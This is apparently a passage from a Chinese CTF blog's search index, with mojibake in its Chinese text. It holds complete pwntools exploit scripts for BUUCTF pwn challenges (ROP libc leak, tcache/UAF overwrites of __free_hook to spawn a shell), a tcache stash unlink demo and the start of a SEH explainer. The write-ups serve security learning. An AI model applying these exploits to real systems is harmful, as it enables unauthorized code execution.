class="number">39</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">51</span>,</span><br><span class="line">        <span class="number">70</span>,</span><br><span class="line">        <span class="number">21</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">11</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">33</span>,</span><br><span class="line">        <span class="number">82</span>,</span><br><span class="line">        <span class="number">93</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">77</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">74</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">98</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">87</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">42</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">88</span>]</span><br><span class="line"></span><br><span class="line">    templist = [<span class="number">0</span>] * <span class="number">38</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ flag[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># flag = templist</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        templist[i] = <span class="built_in">chr</span>(templist[i])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(templist))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwnç³»åˆ—2</title>
      <link href="2021/05/11/pwn2/"/>
      <url>2021/05/11/pwn2/</url>
      
        <content type="html"><![CDATA[<h3 id="rootersctf-2019-babypwn"><a href="#rootersctf-2019-babypwn" class="headerlink" title="rootersctf_2019_babypwn"></a>rootersctf_2019_babypwn</h3><ul><li>è€ƒç‚¹ï¼šæ ˆæº¢å‡ºï¼Œropgadgetï¼Œleak libcï¼Œubuntu18å­—èŠ‚å¯¹é½</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./rootersctf_2019_babypwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="number">29701</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401223</span></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want me to echo back&gt; &quot;</span>)</span><br><span class="line">payload = <span class="number">0x100</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x401146</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC BASE:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_addr)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">bss_base = <span class="number">0x404040</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh = libc_addr + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = <span class="number">0x108</span> * <span class="string">b&#x27;a&#x27;</span> + p64(ret) + p64(pop_rdi_ret) + p64(sh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="xm-2019-awd-pwn2"><a href="#xm-2019-awd-pwn2" class="headerlink" title="xm_2019_awd_pwn2"></a>xm_2019_awd_pwn2</h3><ul><li>è€ƒç‚¹ï¼šuaf</li></ul><p>ç®€å•çš„uaf</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./xm_2019_awd_pwn2&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="number">27761</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">s, addr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span> % (s, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;b\n&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_addr = u64(p.recvuntil(</span><br><span class="line">    <span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">echo(<span class="string">&quot;libc&quot;</span>, libc_addr)</span><br><span class="line">__free_hook = libc_addr + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(__free_hook) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a>gyctf_2020_document</h3><ul><li>è€ƒç‚¹ï¼š<ul><li>uaf</li><li>unsorted bin</li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./gyctf_2020_document&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &#x27;/glibc/2.23/64/lib/libc-2.23.so&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="string">&quot;aaaaaaaa&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">    add(<span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> * (<span class="number">0x70</span> // <span class="number">0x8</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_base = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:    &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    add(<span class="string">&quot;aaaaaaaa&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x70</span>)   <span class="comment"># 2</span></span><br><span class="line">    add(<span class="string">&quot;aaaaaaaa&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x70</span>)   <span class="comment"># 3</span></span><br><span class="line">    __free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(__free_hook - <span class="number">0x10</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x70</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">&quot;Y&quot;</span>, payload)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">&quot;N&quot;</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]).ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name, sex, content</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_add))</span><br><span class="line">    sa(<span class="string">&quot;input name&quot;</span>, name)</span><br><span class="line">    sa(<span class="string">&quot;input sex&quot;</span>, sex)</span><br><span class="line">    sa(<span class="string">&quot;input information&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, flag, content</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;Give me your index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Are you sure change sex?&quot;</span>, flag)</span><br><span class="line">    sa(<span class="string">&quot;Now change information&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;Give me your index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;Give me your index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set $base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Stash Unlink Demo æ¼”ç¤º</title>
      <link href="2021/05/11/Tcache-Stash-Unlink-demo/"/>
      <url>2021/05/11/Tcache-Stash-Unlink-demo/</url>
      
        <content type="html"><![CDATA[<h3 id="å®ä¾‹æºç æ¼”ç¤º"><a href="#å®ä¾‹æºç æ¼”ç¤º" class="headerlink" title="å®ä¾‹æºç æ¼”ç¤º"></a>å®ä¾‹æºç æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> target = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"><span class="keyword">char</span> *smallchunk1;</span><br><span class="line"><span class="keyword">char</span> *smallchunk2;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ä½¿ç”¨æ­¤æ”»å‡»æ‰‹æ³•æ‚¨å¯ä»¥å®ç°å‘ä»»æ„åœ°å€å†™å…¥ä¸€ä¸ªå¤§æ•°\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç›®æ ‡:%p,å€¼:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1.é¦–å…ˆç”³è¯·å…­å—0x60å¤§å°çš„chunkï¼Œç„¶åå…¨éƒ¨freeæ‰ä½¿ä¹‹è¿›å…¥tcahce binä¸­\n\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;å…­å—è¿›å…¥tcacheçš„chunkåœ°å€ä¸º%p,%p,%p,%p,%p,%p\n\n\n&quot;</span>,p - (<span class="number">0x70</span> * <span class="number">5</span>), p - (<span class="number">0x70</span> * <span class="number">4</span>),p - (<span class="number">0x70</span> * <span class="number">3</span>),p - (<span class="number">0x70</span> * <span class="number">2</span>),p - (<span class="number">0x70</span> * <span class="number">1</span>),p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2.åœ¨smallbinä¸­åˆ¶é€ å‡ºä¸¤å—åŒæ ·å¤§å°çš„chunk\n\n\n&quot;</span>);</span><br><span class="line">smallchunk1 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç”³è¯·çš„ä¸€ä¸ªè¶…è¿‡tcachebinå¤§å°èŒƒå›´çš„chunk:%p,åŒæ—¶ç”³è¯·ä¸€ä¸ªchunké˜²æ­¢æ­¤chunk freeåä¸top chunkåˆå¹¶\n\n\n&quot;</span>,smallchunk1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç”³è¯·ä¸€ä¸ªchunkä½¿å¾—å‰©ä¸‹çš„chunkçš„å¤§å°æ­£å¥½ä¸º0x70,éšåå†ç”³è¯·ä¸€ä¸ªå¤§äºunsorted binä¸­çš„chunk,ä½¿å¾—å‰©ä¸‹çš„0x70å¤§å°çš„chunkè¿›å…¥small binä¸­\n\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;æ­¤æ—¶smallbinä¸­å·²ç»æœ‰ä¸€ä¸ªchunk:%p,å†æ¥ç”¨åŒæ ·çš„æ–¹æ³•æ¥æ„é€ ä¸€ä¸ª\n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line">smallchunk2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;small binä¸­çš„chunkä¸º %p  %p \n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>,smallchunk2 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ä¿®æ”¹åè¿›å…¥çš„chunkçš„bkä¸ºtarget-0x10,éšåç”¨callocç”³è¯·ä¸€ä¸ªchunk,è§¦å‘stashæœºåˆ¶,å®Œæˆå¯¹äºå‘ç›®æ ‡å†™å…¥å¤§æ•°çš„æ”»å‡»,è¾¾æˆäº†å’Œunsorted bin attackåŒæ ·çš„æ•ˆæœ\n&quot;</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(smallchunk2 + <span class="number">0x3a0</span> + <span class="number">0x18</span>) = (<span class="keyword">uint64_t</span> )(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç›®æ ‡:%p,å€¼:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/18/e2BxW9sMLPhygGU.png" alt="image-20210316153317569.png" style="zoom:50%;" /></p><p>ç›´æ¥å®šä½åˆ°æœ€åä¸€æ­¥åœ¨gdbä¸­è·Ÿè¸ªä¸€ä¸‹</p><p><img src="https://i.loli.net/2021/03/18/xkQwP3HmVvUBEs9.png" alt="image-20210316153932123.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/zDCil4uMr2LqUSm.png" alt="image-20210316154421877.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/6d4z2JrMKQnNSDE.png" alt="image-20210316154649615.png" style="zoom:43%;" /></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEH</title>
      <link href="2021/05/10/SEH/"/>
      <url>2021/05/10/SEH/</url>
      
        <content type="html"><![CDATA[<h3 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3><p>ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆSEHï¼‰æ˜¯Windowsæ“ä½œç³»ç»Ÿæä¾›çš„å¼ºå¤§å¼‚å¸¸å¤„ç†åŠŸèƒ½ã€‚è€ŒVisual C++ä¸­çš„__<em>try{}/\</em>_finally{}å’Œ__try{}/__except{}ç»“æ„æœ¬è´¨ä¸Šæ˜¯å¯¹Windowsæä¾›çš„SEHçš„å°è£…ã€‚</p><h4 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h4><p>çº¿ç¨‹ä¿¡æ¯å—TIB</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">//å¼‚å¸¸çš„é“¾è¡¨</span></span><br><span class="line"></span><br><span class="line">     PVOID StackBase;</span><br><span class="line">     PVOID StackLimit;</span><br><span class="line">     PVOID SubSystemTib;</span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">         PVOID FiberData;</span><br><span class="line">         DWORD Version;</span><br><span class="line">     &#125;;</span><br><span class="line"> </span><br><span class="line">     PVOID ArbitraryUserPointer;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>  